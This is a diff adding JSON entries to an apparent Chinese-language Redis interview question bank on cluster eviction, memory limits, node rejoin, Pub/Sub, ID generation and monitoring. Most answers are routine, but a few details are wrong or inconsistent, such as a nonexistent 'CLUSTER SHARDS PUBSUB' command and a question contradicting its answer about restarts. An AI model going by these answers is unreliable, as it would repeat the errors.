+      "answer": "Redis 集群中设置 maxmemory 后，当内存达到限制时的行为：1）根据 maxmemory-policy 策略逐出 key（eviction），每次写入命令前检查内存使用量，如果超过 maxmemory 则根据策略淘汰 key 腾出空间：volatile-lru/allkeys-lru（淘汰 LRU 键）、volatile-lfu/allkeys-lfu（淘汰 LFU 键）、volatile-random/allkeys-random（随机淘汰）、volatile-ttl（淘汰最快过期的）、noeviction（不淘汰，写入返回 OOM 错误）；2）读取和删除操作不受影响（DEL、EXPIRE 等可以正常执行）；3）如果策略为 noeviction 且内存耗尽，所有写入（SET/INCR/LPUSH 等）返回 OOM 错误；4）淘汰是在每个节点独立进行的——一个节点内存满不影响其他节点；5）INFO stats 中的 evicted_keys 计数器记录该节点被淘汰的 key 总量；6）集群中如果某个节点的数据淘汰过激（不断淘汰再写入再淘汰），可能造成性能严重下降（淘汰竞争），应及时扩容该节点。建议集群各节点统一配置淘汰策略以保持行为一致。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群中，如果设置了 maxmemory，当内存达到限制时会发生什么（根据驱逐策略删除键） ?"
+    },
+    {
+      "number": 253,
+      "id": "Redis 数据库面试题-253",
+      "category": "Redis 数据库",
+      "answer": "不同数据逐出策略（maxmemory-policy）在集群环境下每个节点独立配置：1）配置方式：在各节点的 redis.conf 中设置 maxmemory-policy <策略名>，或运行时 CONFIG SET maxmemory-policy <策略名>。2）节点独立性：集群的每个节点可以配置不同的淘汰策略（如高命中的节点用 allkeys-lru、用作缓存的节点用 volatile-lru），但通常建议所有节点统一策略以简化运维和监控。3）策略选择：缓存场景用 allkeys-lru 或 allkeys-lfu；部分数据需持久且有过期时间用 volatile-lru 或 volatile-lfu；不希望数据被淘汰用 noeviction 配合外部删除管理。4）注意事项：A）淘汰策略不影响过期策略（过期删除始终生效）；B）LFU 比 LRU 更能保留真正的热点数据，但 LFU 计数器需要时间积累，新 key 可能被过早淘汰（可通过 lfu-log-factor 和 lfu-decay-time 调优）；C）无过期时间的 key 在 volatile-* 策略下永远不会被淘汰（除非通过过期删除），内存泄漏风险更高。",
+      "tags": [],
+      "question": "请简述不同数据逐出策略（maxmemory-policy）在集群环境下如何配置（每个节点独立配置） ?"
+    },
+    {
+      "number": 254,
+      "id": "Redis 数据库面试题-254",
+      "category": "Redis 数据库",
+      "answer": "在线修改 Redis 集群节点的最大内存限制方法：1）CONFIG SET maxmemory <bytes>：运行时动态修改，立即生效，无需重启。例如 CONFIG SET maxmemory 2gb（或 2147483648 字节）。2）持久化修改：CONFIG REWRITE 将当前运行配置写入 redis.conf 文件，确保重启后仍然有效。或手动修改 redis.conf 中的 maxmemory 行。3）集群中修改：需要在每个需要调整的节点上分别执行 CONFIG SET maxmemory（CONFIG SET 不会在集群中广播）。4）查看当前设置：CONFIG GET maxmemory → 确认设置生效。5）扩容注意事项：A）确保服务器物理内存足够支撑新的 maxmemory（考虑 COW fork 和碎片需要物理内存 > maxmemory）；B）增大 maxmemory 后监控节点实际内存使用（used_memory 和 used_memory_rss）确认在物理内存范围；C）减小时注意当前 used_memory——如果当前使用量已超过新设的 maxmemory，下次写入时立即触发淘汰策略。6）不需要重启节点——这是 Redis 灵活性的重要体现。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何在线修改 Redis 集群节点的最大内存限制（需要重启节点） ?"
+    },
+    {
+      "number": 255,
+      "id": "Redis 数据库面试题-255",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群节点重启后重新加入集群的过程是自动的：1）重启时 Redis 读取 nodes.conf 文件（cluster-config-file 参数指定），恢复节点 ID 和已知的集群拓扑信息（包括其他节点的 IP:PORT 和 node ID）；2）节点启动后尝试联系 nodes.conf 中记录的至少一个已知节点，通过 MEET 消息重新建立 Gossip 连接；3）被联系的节点发现该节点（根据 node ID）已在集群拓扑中，更新其状态为 online 并标记为连接正常；4）Gossip 协议将此节点回归的信息逐步传播至整个集群；5）从节点重启后自动恢复与主节点的复制关系（如果主节点正常），发起增量同步（PSYNC）或全量同步（BGSAVE→RDB）；6）主节点重启后检查自己负责的槽→重新服务这些槽的请求；7）异常情况处理：A）如果 nodes.conf 被删除或损坏，节点以新 Node ID 加入→需 CLUSTER FORGET 旧节点 ID 并 CLUSTER MEET 新节点；B）如果重启期间主节点宕机且从节点被提为新主，旧主重启后会自动检测 configEpoch 变化并降级为新主的从节点。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的节点重启后，如何重新加入集群（自动读取配置信息尝试加入） ?"
+    },
+    {
+      "number": 256,
+      "id": "Redis 数据库面试题-256",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群支持 socket 长连接优化。默认情况下，Redis 客户端与服务器之间使用 TCP 长连接（一个客户端可以在多个命令之间保持连接不断开），而非每次操作都创建新连接。优化建议：1）客户端方使用连接池（如 JedisPool、Lettuce Connection Pool）复用 TCP 连接，避免频繁 TCP 三次握手和四次挥手开销；2）Redis 服务器端配置 tcp-keepalive：开启 TCP Keep-Alive 探针检测死连接并清理（CONFIG SET tcp-keepalive 300 表示 300 秒无数据交换后发送探针）；3）timeout 参数：设置客户端空闲超时时间（CONFIG SET timeout 0 表示不断开空闲连接；>0 表示超时后自动断开，可避免僵死连接占用资源）；4）集群总线端口连接同样维持长连接（节点间 Gossip 通信的长连接），配置 cluster-node-timeout 控制心跳检查间隔；5）maxclients 限制最大连接数，需要根据连接池大小和服务节点数合理规划；6）Lettuce 使用 Netty 的 NIO/epoll 管理连接池，性能更优。长连接复用是 Redis 高性能的关键因素之一，生产环境务必启用连接池。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群是否支持 socket 长连接优化 ?"
+    },
+    {
+      "number": 257,
+      "id": "Redis 数据库面试题-257",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群环境下实现消息队列的发布订阅功能需了解广播机制的性能开销：1）集群中的 Pub/Sub 采用全集群广播机制——向任意节点 PUBLISH 的消息会被转发到集群中所有其他节点（通过集群总线），每个节点再分发给本地订阅者。2）性能开销：N 个节点的集群中，一次 PUBLISH 产生 N-1 次节点间消息转发 + 各节点本地分发。集群越大、订阅者越多，开销越大，可能成为性能瓶颈。3）不适合大规模 Pub/Sub 场景（如几十万订阅者、高频率发布），广播风暴会严重拖慢集群。4）替代方案：A）使用 Redis Stream 代替 Pub/Sub——Stream 支持消费者组、持久化、消息回溯，且消息只在数据所在节点存储，不全集群广播；B）使用专门的 MQ 中间件（Kafka、RabbitMQ）做大规模消息队列；5）如果必须用 Pub/Sub，注意：集群规模不要太大（<10 节点）、控制发布频率、订阅者尽量在本地消费而非跨节点；6）7.0+ 对 Pub/Sub 的效率有一定改进（sharded Pub/Sub——CLUSTER SHARDS PUBSUB），将消息限制在特定分片而非全集群广播。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群环境下，如何实现消息队列的发布订阅功能（广播机制的性能开销） ?"
+    },
+    {
+      "number": 258,
+      "id": "Redis 数据库面试题-258",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的无中心化设计（Decentralized Architecture）指集群没有单一的协调者或元数据服务器。优势：1）无单点故障：任何节点宕机都不会导致整个集群元数据服务不可用（不像 ZooKeeper 的 Leader 故障切换）；2）高可用自愈能力：节点通过 Gossip 协议自动感知拓扑变化并触发故障转移，无需人工介入或中心调度；3）线性扩展：增删节点只需修改局部配置并通过 Gossip 传播，无中心瓶颈；4）简单性：不需要额外的协调组件（如 etcd/ZK），减少运维依赖。挑战：1）配置收敛时间：Gossip 协议的最终一致意味着状态变化后所有节点同步到一致状态需要时间（秒级），不是强一致性；2）脑裂风险：网络分区可能导致双主（epoch 机制缓解但不能完全杜绝）；3）大规模集群的 Gossip 开销：节点数增加时消息量 O(N)，需限制集群规模；4）调试复杂：去中心化使问题定位（如配置不一致）比中心化系统更困难；5）客户端需配合智能路由。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述什么是 Redis 集群的“无中心化”设计它的优势和挑战是什么 ?"
+    },
+    {
+      "number": 259,
+      "id": "Redis 数据库面试题-259",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群与其他 NoSQL 分布式数据库（Cassandra、MongoDB）的设计哲学异同：相同点：1）都支持水平扩展和数据分片；2）都支持数据冗余和故障转移；3）都提供最终一致性或可调一致性的机制。不同点：1）数据模型：Redis 是 key-value + 数据结构（String/List/Set/ZSet/Hash/Stream），Cassandra 是 Wide Column（类似表格），MongoDB 是文档型（JSON/BSON）；2）持久化：Redis 主要是内存存储+可选持久化，Cassandra 和 MongoDB 是磁盘存储+内存缓存；3）一致性模型：Redis 集群偏向 AP（最终一致性+高可用），Cassandra 基于 Dynamo 也是 AP，MongoDB 提供 CP/AP 可调；4）数据分布算法：Redis 用哈希槽（16384），Cassandra 用一致性哈希，MongoDB 用 range-based/哈希分片；5）查询能力：Redis 查询简单（key 查找），Cassandra 用 CQL（类 SQL），MongoDB 查询语言丰富（聚合管道等）；6）性能定位：Redis 是极致速度（微秒级），Cassandra 高写入吞吐（毫秒级），MongoDB 在灵活性和性能间折中。",
+      "tags": [
+        "Redis",
+        "SQL"
+      ],
+      "question": "请简述Redis 集群与其他 NoSQL 分布式数据库（如 Cassandra、MongoDB）的设计哲学有何异同 ?"
+    },
+    {
+      "number": 260,
+      "id": "Redis 数据库面试题-260",
+      "category": "Redis 数据库",
+      "answer": "设计跨多个 Redis 集群的全局 ID 生成器方案：1）多集群各自独立生成：每个集群使用独立的 ID 生成器（如 Redis INCR 或雪花算法），通过 ID 前缀或高位区段区分集群（如高 8 位 = 集群编号，低 56 位 = 集群内序号）。2）号段模式（号段分配）：从中心 ID 生成服务（基于 DB 或 ZK）批量预分配号段给各集群，各集群用 Redis INCR 在该号段内分配 ID，号段用完再申请新号段。一次申请 ID 范围如 100001-200000，减少跨集群协调频率。3）雪花算法（Snowflake）+ Redis 分配 workerId：每个 Redis 集群作为一个 Worker（workerId 唯一），在集群内部用 INCR 生成序号（sequence），雪花算法生成全局唯一 ID；4）多集群共享中心 Redis：部署一套独立的 Redis 哨兵/集群专用于 ID 生成，所有业务集群共享此 Redis；5）Redis + Lua 批量生成：一次 Lua 脚本调用返回一批 ID 缓存于本地，减少网络开销；6）强调单调递增和全局唯一：确保不同集群生成的 ID 严格单调递增且不冲突（号段模式满足），对排序有要求的场景（如订单 ID、消息 ID）尤其重要。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何设计一个跨多个 Redis 集群的全局 ID 生成器 ?"
+    },
+    {
+      "number": 261,
+      "id": "Redis 数据库面试题-261",
+      "category": "Redis 数据库",
+      "answer": "对 Redis 集群进行压力测试的方法：1）redis-benchmark（Redis 自带）：redis-benchmark -h host -p port -c <clients> -n <requests> -d <data_size> -t <command> --cluster。集群模式下需使用 --cluster 选项（会随机连接节点执行测试）。常用参数：-c 1000（模拟 1000 并发连接）、-n 1000000（总共 100 万次请求）、-d 100（数据大小 100 字节）、-t set,get（测试 SET/GET）、--threads 4（多线程）。2）自定义压测工具：使用 redis-benchmark 或 memtier_benchmark 模拟多种负载；3）在生产集群隔离出的测试集群上压测（避免影响在线业务）；4）压测关注指标：A）QPS（每秒请求数）和 P50/P99 延迟；B）各节点的 CPU 和内存使用（top/htop/INFO CPU）；C）网络流量（节点间 Gossip + 客户端请求）；D）集群重新分片和故障转移的恢复时间；5）memtier_benchmark 支持集群模式：memtier_benchmark --cluster-mode；6）分布式压测：从多台压测客户端同时压测，模拟真实流量；7）记录和对比不同集群配置（如不同数量主节点、不同淘汰策略）下的表现。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何对 Redis 集群进行压力测试（使用 redis-benchmark 或定制工具） ?"
+    },
+    {
+      "number": 262,
+      "id": "Redis 数据库面试题-262",
+      "category": "Redis 数据库",
+      "answer": "云环境托管 Redis 集群与自建集群的优缺点对比：托管（如 AWS ElastiCache、阿里云 ApsaraDB for Redis、腾讯云 Redis）：优点——1）一键创建和管理，无需手动配置节点、安全组、持久化、备份；2）自动故障检测和恢复（通常是秒级）；3）自动备份和恢复；4）在线扩容和缩容（通常零停服或短暂停服）；5）监控和告警集成（与云监控系统打通）；6）安全合规（VPC 隔离、加密传输、审计日志等）。缺点——1）成本较高（服务费+节点费用）；2）部分版本落后于社区（如不提供最新 Redis 7.X）；3）定制能力有限（部分配置被限制）；4）绑定特定云平台，跨云迁移困难。自建：优点——1）完全可控（版本选择、配置优化、资源规划）；2）长期来看成本可能更低（自主规划资源）；3）无厂商锁定。缺点——1）运维负担重（安装、配置、监控、扩容、故障处理）；2）需要专业的 Redis 运维经验；3）高可用架构需要自行设计和保障。选型建议：中小团队、需要快速上线的优选托管；对成本敏感、技术实力强的团队可选自建。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在云环境（如 AWS ElastiCache for Redis、阿里云 ApsaraDB for Redis）中使用托管 Redis 集群与自建集群各有什么优缺点 ?"
+    },
+    {
+      "number": 263,
+      "id": "Redis 数据库面试题-263",
+      "category": "Redis 数据库",
+      "answer": "监控和优化 Redis 集群网络流量的方法：1）监控网络流量组成：A）客户端<->Redis 节点之间的数据请求/响应流量（主要流量来源）；B）节点间 Gossip 通信流量（PING/PONG、MEET、FAIL、PUBLISH 等，每个节点每秒多次随机心跳）；C）主从复制流量（主→从 RDB 传输和增量数据流）；D）槽迁移流量（reshard 时的 MIGRATE 数据传输）。2）监控工具：A）使用 iftop/nethogs/iftop 监控节点网卡出入流量；B）Redis INFO stats 中的 total_net_input_bytes/total_net_output_bytes（节点启动以来总流量）；C）Prometheus node_exporter（系统级）+ redis_exporter（应用级）→Grafana 可视化展示各节点和各维度的流量趋势。3）优化措施：A）Pipeline 批量操作（减少单个命令的协议开销和网络往返）；B）使用高效的序列化格式（protobuf/msgpack 替代 JSON）；C）压缩大 value（snappy/LZ4）；D）合理的 cluster-node-timeout（不要过短，减少心跳频率相关开销）；E）控制集群规模以减少 Gossip 开销（节点数不宜过多）；F）数据尽可能本地化（同机房/同 AZ 部署节点和客户端，避免跨区域高延迟链路）；G）使用 Redis 6.0+ 的多线程 I/O 加快网络读写速度。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述如何监控和优化 Redis 集群的网络流量（节点间 Gossip 通信 + 客户端数据访问） ?"
+    }
+  ]
+}
